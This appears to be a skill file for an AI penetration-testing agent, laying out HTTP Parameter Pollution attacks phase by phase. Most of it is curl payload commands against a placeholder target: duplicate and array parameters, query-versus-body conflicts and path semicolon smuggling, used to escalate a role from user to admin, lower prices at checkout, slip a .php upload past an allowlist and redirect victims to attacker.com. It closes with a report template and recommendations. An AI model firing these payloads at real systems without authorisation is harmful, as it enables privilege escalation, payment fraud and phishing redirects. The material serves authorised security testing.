---
name: payload-http-param-pollution
description: "HTTP Parameter Pollution (HPP) testing. Duplicate parameter injection, first-wins vs last-wins precedence, query/body override, JSON body conflict, path semicolon smuggling, validation bypass via arrays. Triggers: 'http parameter pollution', 'hpp', 'duplicate parameters', 'parameter pollution', 'parameter override', 'parameter smuggling', 'first-wins last-wins', 'parameter bypass'."
---

# HTTP Parameter Pollution (HPP)

Abuse duplicate/ambiguous parameters to bypass validation, override values, or exploit parsing inconsistencies.

---

## Phase 1: Identify Candidate Endpoints

```bash
TARGET="https://TARGET"

# Find endpoints with sensitive parameters:
# role, user, admin, redirect, price, amount, filter, sort, next, return, id
curl -s "$TARGET/sitemap.xml" | grep -oE 'https?://[^<"]+' | grep -E "\?|&"

# From burp/proxy history — look for:
# ?role=user
# ?redirect=https://trusted.com
# ?price=100
# ?id=123
```

---

## Phase 2: Parameter Precedence Testing

```bash
TARGET="https://TARGET/endpoint"

# Test which value wins when duplicate parameters sent:
curl -s "$TARGET?role=user&role=admin" \
  -o /tmp/hpp_test1.txt

curl -s "$TARGET?role=admin&role=user" \
  -o /tmp/hpp_test2.txt

diff /tmp/hpp_test1.txt /tmp/hpp_test2.txt
# Different response → parameter order matters → HPP possible

# Flask/PHP: first-wins
# ASP.NET: last-wins
# Node.js: varies by parser
# Common: array (both values kept)
```

---

## Phase 3: Payload Patterns

```bash
TARGET="https://TARGET"

# Duplicate parameter attacks:
curl -s "$TARGET?id=1&id=2"
curl -s "$TARGET?role=user&role=admin"
curl -s "$TARGET?redirect=https://trusted.com&redirect=https://attacker.com"

# Array-style (framework-dependent):
curl -s "$TARGET?param[]=1&param[]=2"
curl -s "$TARGET?param[0]=1&param[1]=2"
curl -s "$TARGET?param[a]=1&param[b]=2"

# Separator smuggling:
curl -s "$TARGET?param=1;param=2"
curl -s "$TARGET?param=1|param=2"
curl -s "$TARGET?param=1,param=2"

# JSON body with duplicate keys:
curl -s -X POST "$TARGET" \
  -H "Content-Type: application/json" \
  -d '{"role":"user","role":"admin"}'
```

---

## Phase 4: Query vs Body Conflict

```bash
TARGET="https://TARGET"

# GET param + POST body:
curl -s -X POST "$TARGET?role=user" \
  -H "Content-Type: application/x-www-form-urlencoded" \
  --data "role=admin"

# JSON body vs query string:
curl -s -X POST "$TARGET?role=user" \
  -H "Content-Type: application/json" \
  --data '{"role":"admin"}'

# Header-based override:
curl -s "$TARGET?role=user" \
  -H "X-Role: admin"

# Cookie vs param:
curl -s "$TARGET?role=user" \
  --cookie "role=admin"
```

---

## Phase 5: Path Parameter Smuggling

```bash
TARGET="https://TARGET"

# Semicolon in path (some servers parse as path param):
curl -s "https://TARGET/endpoint;role=admin"

# Slash injection:
curl -s "https://TARGET/endpoint/role=admin"

# Dot segment:
curl -s "https://TARGET/endpoint/./role=admin"

# Matrix URL parameters (JAX-RS, Spring):
curl -s "https://TARGET/api/users;admin=true/profile"
```

---

## Phase 6: Validation Bypass via HPP

```bash
TARGET="https://TARGET"

# Scenario: WAF checks first param, app uses last param:
# Allowlist check on first value, bypass with second:
curl -s "$TARGET?type=image&type=php"
curl -s "$TARGET?extension=.jpg&extension=.php"

# Price/amount override:
curl -s -X POST "$TARGET/checkout" \
  -d "price=1&price=100&item_id=expensive_item"

# Redirect chain bypass:
# redirect=https://trusted.com → validated
# &redirect=https://attacker.com → used by app
curl -s "$TARGET/redirect?next=https://trusted.com&next=https://attacker.com"
```

---

## Report Template

```markdown
## HTTP Parameter Pollution Assessment

### Findings
| Parameter | Method | Impact |
|:----------|:------:|:-------|
| `role` | QS duplicate | Privilege escalation (user→admin) |
| `redirect` | QS+body | Open redirect bypass |
| `price` | JSON dupe key | Price manipulation |

### Evidence
- Test 1 (first-wins): response A
- Test 2 (last-wins): response B
- Payloads tested: see hpp_payloads.txt

### Recommendations
1. Reject requests with duplicate parameters — return 400
2. Enforce strict schema validation (reject unknown/extra params)
3. Normalize parsing across WAF/proxy/app layers
4. Use allowlist for expected parameter names and counts
```

---

## Output

Save to `.omop/engagement/vuln/hpp/`:
- `precedence-test.txt` — first-wins vs last-wins evidence
- `bypass-proof.txt` — successful validation bypass

## Next Phase

→ `pentest-report` for final report
→ `vuln-cache-deception` if caching involved
